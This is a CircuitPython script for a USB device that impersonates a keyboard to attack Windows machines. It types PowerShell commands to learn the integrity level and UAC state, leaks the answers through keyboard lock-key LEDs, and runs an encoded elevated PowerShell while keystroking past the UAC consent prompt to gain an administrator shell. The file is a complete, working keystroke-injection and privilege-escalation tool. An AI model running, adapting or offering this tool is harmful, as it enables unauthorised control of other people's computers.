import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
import time

# Initialize the keyboard
keyboard = Keyboard(usb_hid.devices)

# Define a function to send a key string
def send_keys(key_string):
    keyboard_layout = KeyboardLayoutUS(keyboard)

    # Type the key string
    keyboard_layout.write(key_string)

# Example usage
def send_win_r():
    keyboard.send(Keycode.GUI, Keycode.R)
    time.sleep(0.5)  # Adjust the delay as needed between key presses

def send_enter():
    keyboard.send(Keycode.ENTER)
    time.sleep(0.1)  # Adjust the delay as needed

def start_powershell():
    send_win_r()
    send_keys("powershell")
    send_enter()
    time.sleep(1)

def add_shellkeyboard():
    send_keys("$wsh = New-Object -ComObject WScript.Shell")
    send_enter()

def toggle_caps():
    keyboard.press(Keycode.CAPS_LOCK)
    time.sleep(0.1)
    keyboard.release(Keycode.CAPS_LOCK)
    time.sleep(0.5)

def toggle_num():
    keyboard.press(0x53)
    time.sleep(0.1)
    keyboard.release(0x53)
    time.sleep(0.5)

def toggle_scroll():
    keyboard.press(Keycode.SCROLL_LOCK)
    time.sleep(0.1)
    keyboard.release(Keycode.SCROLL_LOCK)
    time.sleep(0.5)

def send_command_raw(command):
    send_keys(command)
    send_enter()

def send_command_one(command,string1):
    #either caps on for true, caps off for false
    send_keys("$output = $("+str(command)+");if ($output -like \"*"+string1+"*\"){$wsh.SendKeys('{CAPSLOCK}')};$wsh.SendKeys('{SCROLLLOCK}')")
    send_enter()

def send_command_two(command,string1,string2):
    #command to search for two seperate strings in results. Caps for string1 num for string2
    send_keys("$output = $("+str(command)+");if ($output -like \"*"+string1+"*\"){$wsh.SendKeys('{CAPSLOCK}')};if ($output -like \"*"+string2+"*\"){$wsh.SendKeys('{NUMLOCK}')};$wsh.SendKeys('{SCROLLLOCK}')")
    send_enter()

def waitforscroll():
    while 1:
        if(keyboard.led_on(Keyboard.LED_SCROLL_LOCK)):
            time.sleep(1)
        else:
            break


def command_eval_whoami_groups():
    send_command_two("whoami /groups","Medium Mandatory Level","High Mandatory Level")
    waitforscroll()
    if(keyboard.led_on(Keyboard.LED_CAPS_LOCK)):
        print("Running at medium")
        toggle_caps()
    if(keyboard.led_on(Keyboard.LED_NUM_LOCK)):
        print("Running at high")
        toggle_num()
    toggle_scroll()

def command_eval_UAC():
    send_command_raw("$UACSetting = Get-ItemProperty -Path \"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" -Name \"EnableLUA\";if ($UACSetting.EnableLUA -eq 1) {$wsh.SendKeys('{CAPSLOCK}')} else {$wsh.SendKeys('{NUMLOCK}')};$wsh.SendKeys('{SCROLLLOCK}')")
    waitforscroll()
    if(keyboard.led_on(Keyboard.LED_CAPS_LOCK)):
        print("UAC Enabled")
        toggle_caps()
    if(keyboard.led_on(Keyboard.LED_NUM_LOCK)):
        print("UAC Disabled")
        toggle_num()
    toggle_scroll()

def command_eval_checkUAC():
    send_command_raw("Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-enc JAB3AHMAaAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAkAHcAcwBoAC4AUwBlAG4AZABLAGUAeQBzACgAJwB7AEMAQQBQAFMATABPAEMASwB9ACcAKQA7ACQAdwBzAGgALgBTAGUAbgBkAEsAZQB5AHMAKAAnAHsATgBVAE0ATABPAEMASwB9ACcAKQA=\" -Verb RunAs -PassThru")
    time.sleep(0.5)
    keyboard.press(Keycode.SHIFT, Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    send_enter()
    time.sleep(0.5)
    for i in range(0,1000):
        if(keyboard.led_on(Keyboard.LED_NUM_LOCK) and keyboard.led_on(Keyboard.LED_CAPS_LOCK)):
            print("UAC Bypassed - user is likely an admin")
            toggle_num()
            toggle_caps()
            return True
    print("Unable to elevate, user is probably not an admin")
    return False

def start_powershell_as_admin_from_cli():
    send_command_raw("Start-Process -FilePath \"powershell.exe\" -Verb RunAs")
    time.sleep(0.5)
    keyboard.press(Keycode.SHIFT, Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    send_enter()
    time.sleep(0.5)
    add_shellkeyboard()
    command_eval_whoami_groups()
    send_keys("Im now an admin")

def isScrollOn():
    if(keyboard.led_on(Keyboard.LED_SCROLL_LOCK)):
        print("LOCK IS ON")
        return True
    return False

def isCapsOn():
    if(keyboard.led_on(Keyboard.LED_CAPS_LOCK)):
        return True
    return False

def isNumOn():
    if(keyboard.led_on(Keyboard.LED_NUM_LOCK)):
        return True
    return False

def turn_off_all_locks():
    toggle_scroll()
    toggle_num()
    toggle_caps()
    if(isScrollOn()):toggle_scroll()
    if(isNumOn()): toggle_num()
    if(isCapsOn()): toggle_caps()


turn_off_all_locks()
#leave scroll on
toggle_scroll()


print("[+] Starting Powershell")
start_powershell()
print("[+] Adding keyboard to console")
add_shellkeyboard()

print("[+] Confirming integrity of shell")
command_eval_whoami_groups()

print("[+] Confirming if UAC is enabled")
command_eval_UAC()

# Attempt elevation to admin test
if (command_eval_checkUAC()):
    # Try a full blown elevation to admin
    print("[+] UAC Bypass looks good, trying to get admin")
    start_powershell_as_admin_from_cli()
else:
    print("[+] UAC passthrough failed")
    print("[+] Further enum for priv esc needed")
